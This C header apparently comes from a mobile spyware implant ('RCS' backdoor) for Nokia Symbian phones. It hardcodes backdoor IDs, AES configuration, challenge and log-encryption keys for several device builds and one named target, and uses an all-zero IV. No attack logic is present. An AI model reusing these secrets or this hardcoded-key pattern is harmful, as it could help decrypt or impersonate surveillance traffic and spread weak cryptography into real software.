/*
 * Keys.h
 *
 *  Created on: 13/feb/2011
 *      Author: Giovanna
 */

#ifndef KEYS_H_
#define KEYS_H_

#include <e32std.h>
#include <e32base.h>

#define K_KEY_SIZE 16

_LIT8(KVERSION, "\x1e\x98\xdd\x77");  //2011011102

_LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");

// Backdoor Id
#ifdef _DEBUG
//_LIT8(KBACKDOORID, "RCS_0000000007\x00\x00");    //backdoor su preprod N96
//_LIT8(KBACKDOORID, "RCS_0000000122\x00\x00");    //backdoor su preprod N97Mini
//_LIT8(KBACKDOORID, "RCS_0000000036\x00\x00");    //backdoor su preprod N71
//_LIT8(KBACKDOORID, "RCS_0000000038\x00\x00");    //backdoor su preprod N81
_LIT8(KBACKDOORID, "RCS_0000000317\x00\x00");    //backdoor su prod N97Mini
#else
_LIT8(KBACKDOORID, "av3pVck1gb4eR2\x00\x00");
#endif

// ConfKey
#ifdef _DEBUG
//_LIT8(KAES_CONFIG_KEY,"bee9b4b42ca77a88f5babcd45e003d46"); //RCS_0000000007  //N96 preprod
//_LIT8(KAES_CONFIG_KEY,"fe9b9636552fa3366065d93f24b5fb53"); //RCS_0000000036  //N71 preprod
//_LIT8(KAES_CONFIG_KEY,"36e2efa7265c896a8ef45c1cc6102722"); //RCS_0000000122  //N97mini preprod
_LIT8(KAES_CONFIG_KEY,"2aea9bec25ee2bfc8b4ab86d24a4d7b8"); //RCS_0000000317  //N97mini prod
//_LIT8(KAES_CONFIG_KEY,"1181ecdc6fe3a777d0a957df5b8c9317"); //RCS_0000000038  //N81 preprod
#else
_LIT8(KAES_CONFIG_KEY, "Adf5V57gQtyi90wUhpb8Neg56756j87R");
#endif

//Challenge key or Signature, the same for all bkdoors
#ifdef _DEBUG
//_LIT8(KAES_CHALLENGE_KEY, "39290c27b313f19861546e237c6aa451"); //RCS_0000000007 //N96 preprod
//_LIT8(KAES_CHALLENGE_KEY, "39290c27b313f19861546e237c6aa451"); //RCS_0000000036 //N71 preprod
//_LIT8(KAES_CHALLENGE_KEY, "39290c27b313f19861546e237c6aa451"); //RCS_0000000122 //N97Mini preprod
_LIT8(KAES_CHALLENGE_KEY, "572ebc94391281ccf53a851330bb0d99"); //RCS_0000000317 //N97Mini prod
//_LIT8(KAES_CHALLENGE_KEY, "39290c27b313f19861546e237c6aa451"); //RCS_0000000038 //N81 preprod
#else
_LIT8(KAES_CHALLENGE_KEY, "f7Hk0f5usd04apdvqw13F5ed25soV5eD");
#endif

#ifdef _DEBUG
_LIT8(KAES_LOGS_KEY, "95dac559b0edfffc543b06b46c43e610");  //RCS_0000000317  //N97Mini su prod
//_LIT8(KAES_LOGS_KEY, "96db502bbee4cd75f09a7aa9d3c6d659");  //RCS_0000000246  //Montalbano
//_LIT8(KAES_LOGS_KEY, "b9ea53cd1be8515a514074e162a2dbe9");  //RCS_0000000007  //N96 preprod
//_LIT8(KAES_LOGS_KEY, "43c21df87bbf5572f2f549ec35756ae9");  //RCS_0000000036  //N71 preprod
//_LIT8(KAES_LOGS_KEY, "6c3e6fbfd920e8a22e499702ea711d55");  //RCS_0000000038  //N81 preprod
//_LIT8(KAES_LOGS_KEY, "02ab00be97a461fedf9ceeacb0ef73f3");  //RCS_0000000125  //N96
//_LIT8(KAES_LOGS_KEY, "d4078fdf640118f158792a39cf70bab4");  //RCS_0000000135  //E72
//_LIT8(KAES_LOGS_KEY, "87f8398188d816f74657188b7e2a1370");  //RCS_0000000205  //N81
#else
_LIT8(KAES_LOGS_KEY, "3j9WmmDgBqyU270FTid3719g64bP4s52");
#endif


#endif /* KEYS_H_ */
